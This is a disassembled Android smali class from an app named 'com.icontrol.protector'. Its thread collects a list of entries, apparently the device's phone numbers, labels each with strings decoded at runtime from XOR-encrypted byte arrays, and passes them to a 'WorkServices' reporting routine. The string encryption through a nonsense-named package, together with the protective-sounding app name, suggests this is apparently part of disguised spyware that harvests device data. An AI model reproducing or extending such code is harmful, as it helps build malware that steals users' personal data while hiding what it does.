.class Lcom/icontrol/protector/l$a;
.super Ljava/lang/Thread;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/l;->c(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/l$a;->e:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    :try_start_0
    iget-object v0, p0, Lcom/icontrol/protector/l$a;->e:Landroid/content/Context;

    invoke-static {v0}, Lcom/icontrol/protector/l;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v0

    const/16 v1, 0xc

    const/16 v2, 0xa

    const/16 v3, 0x8

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v4

    if-nez v4, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_2

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    new-array v5, v2, [B

    fill-array-data v5, :array_0

    new-array v6, v3, [B

    fill-array-data v6, :array_1

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v6, 0xe

    new-array v7, v6, [B

    fill-array-data v7, :array_2

    new-array v8, v3, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/icontrol/protector/l$a;->e:Landroid/content/Context;

    new-array v7, v1, [B

    fill-array-data v7, :array_4

    new-array v8, v3, [B

    fill-array-data v8, :array_5

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    new-array v6, v6, [B

    fill-array-data v6, :array_6

    new-array v9, v3, [B

    fill-array-data v9, :array_7

    invoke-static {v6, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v5, v7, v4}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_2

    :cond_1
    :goto_1
    new-array v0, v2, [B

    fill-array-data v0, :array_8

    new-array v2, v3, [B

    fill-array-data v2, :array_9

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 v0, 0x17

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v2, v3, [B

    fill-array-data v2, :array_b

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    iget-object v0, p0, Lcom/icontrol/protector/l$a;->e:Landroid/content/Context;

    new-array v1, v1, [B

    fill-array-data v1, :array_c

    new-array v2, v3, [B

    fill-array-data v2, :array_d

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x9

    new-array v2, v2, [B

    fill-array-data v2, :array_e

    new-array v3, v3, [B

    fill-array-data v3, :array_f

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :goto_2
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_2
    return-void

    :array_0
    .array-data 1
        0x6at
        -0x1dt
        -0x31t
        -0x44t
        -0x50t
        -0x4bt
        -0x3et
        0x20t
        0x60t
        -0xct
    .end array-data

    nop

    :array_1
    .array-data 1
        0x2et
        -0x4ft
        -0x76t
        -0x5t
        -0x11t
        -0x1bt
        -0x76t
        0x6ft
    .end array-data

    :array_2
    .array-data 1
        -0x38t
        -0x7bt
        -0x6ct
        0x6bt
        0x78t
        0x7ct
        0x58t
        0x7at
        -0xbt
        -0x71t
        -0x62t
        0x77t
        0x27t
        0x7ct
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x68t
        -0x13t
        -0x5t
        0x5t
        0x1dt
        0x5ct
        0x36t
        0xft
    .end array-data

    :array_4
    .array-data 1
        -0x7t
        0x48t
        -0x59t
        0x4t
        -0x6ct
        -0xat
        0x2dt
        0x23t
        -0x3ct
        0x42t
        -0x53t
        0x18t
    .end array-data

    :array_5
    .array-data 1
        -0x57t
        0x20t
        -0x38t
        0x6at
        -0xft
        -0x2at
        0x43t
        0x56t
    .end array-data

    :array_6
    .array-data 1
        -0x37t
        -0x66t
        0x4at
        0x2dt
        0x5at
        -0x42t
        0x70t
        0x6t
        -0xat
        -0x3dt
        0x3t
        0x30t
        0x15t
        -0xdt
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x7ct
        -0x1dt
        0x6at
        0x43t
        0x2ft
        -0x2dt
        0x12t
        0x63t
    .end array-data

    :array_8
    .array-data 1
        -0x48t
        -0x63t
        0x2ct
        -0x5bt
        0x7at
        0x29t
        0x2at
        0x37t
        -0x4et
        -0x76t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x4t
        -0x31t
        0x69t
        -0x1et
        0x25t
        0x79t
        0x62t
        0x78t
    .end array-data

    :array_a
    .array-data 1
        0x2ct
        -0x12t
        0x2at
        0x2bt
        -0x3t
        -0x64t
        0x62t
        -0x1et
        0x11t
        -0x1ct
        0x20t
        0x37t
        -0x5et
        -0x64t
        0x62t
        -0x8t
        0x8t
        -0x5at
        0x23t
        0x2at
        -0x13t
        -0x2et
        0x68t
    .end array-data

    :array_b
    .array-data 1
        0x7ct
        -0x7at
        0x45t
        0x45t
        -0x68t
        -0x44t
        0xct
        -0x69t
    .end array-data

    :array_c
    .array-data 1
        -0x5t
        0x3et
        -0x6at
        -0x6ft
        0x50t
        0x58t
        -0x40t
        -0x4ft
        -0x3at
        0x34t
        -0x64t
        -0x73t
    .end array-data

    :array_d
    .array-data 1
        -0x55t
        0x56t
        -0x7t
        -0x1t
        0x35t
        0x78t
        -0x52t
        -0x3ct
    .end array-data

    :array_e
    .array-data 1
        0x7bt
        -0x6t
        0x50t
        0x3t
        -0x20t
        0x55t
        -0x2et
        -0x59t
        0x51t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x35t
        -0x6bt
        0x24t
        0x23t
        -0x7at
        0x3at
        -0x59t
        -0x37t
    .end array-data
.end method
